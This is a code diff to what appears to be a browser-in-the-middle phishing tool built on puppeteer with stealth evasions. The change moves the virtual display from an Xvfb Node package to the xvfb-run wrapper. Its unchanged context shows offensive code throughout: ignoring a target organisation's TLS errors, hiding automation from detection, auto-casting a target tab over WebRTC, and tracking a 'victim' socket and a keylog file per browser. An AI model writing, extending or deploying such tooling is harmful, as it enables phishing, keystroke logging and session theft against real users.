@@ -10,7 +10,6 @@ puppeteer.use(StealthPlugin())
 import UserAgentOverride from 'puppeteer-extra-plugin-stealth/evasions/user-agent-override/index.js'
 import resize_window from './resize_window.js'
 import replace from 'stream-replace'
-import Xvfb from 'xvfb'
 
 //import admin config
 const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
@@ -240,19 +239,16 @@ fastify.route({
 })
 
 async function get_browser(target_page){
-  //use a frame buffer to mimic a screen. Headless browsers can't do WebRTC
-  let xvfb = new Xvfb({
-    silent: true,
-    xvfb_args: ["-screen", "0", '1920x1080x24', "-ac"]
-  })
-  xvfb.start((err)=>{if (err) console.error(err)})
+  // Note: We no longer use the Node.js Xvfb package here
+  // Instead, the application should be run with: xvfb-run -a -s "-screen 0 1920x1080x24 -ac" node index.js <target>
+  
   let puppet_options = [
     "--ignore-certificate-errors", //ignore sketchy TLS on the target service in case our target org is lazy with their certs
     `--auto-select-desktop-capture-source=${target.tab_title}`, //Allows us to cast WebRTC with answering a prompt of which tab to share :)
     "--disable-blink-features=AutomationControlled",
     "--start-maximized",
     "--no-sandbox",
-    `--display=${xvfb._display}`,
+    // No need to specify --display, xvfb-run sets DISPLAY environment variable
     
     // Enhanced performance optimizations for video streaming
     "--disable-dev-shm-usage", // Overcome limited resource problems
@@ -294,8 +290,7 @@ async function get_browser(target_page){
   })
 
   //JS is fun. We can just extend any existing object by defining new attributes and methods on it.
-  //We'll add some pieces of data we want to track per browser instance, and a remove instance method while we have this browser's xvfb in local scope
-  //remember, callback arguments are evaluated when the callback is defined
+  //We'll add some pieces of data we want to track per browser instance, and a remove instance method
   browser.socket_id = ''
   browser.victim_socket = ''
   browser.victim_width = 0
@@ -325,7 +320,7 @@ async function get_browser(target_page){
     }
   })
   browser.remove_instance = async function(){
-    xvfb.stop((err)=>{if (err) console.error(err)})
+    // No need to stop xvfb since xvfb-run handles it
     browser.keylog_file.close()
     const index = browsers.indexOf(browser);
     await browser.close()
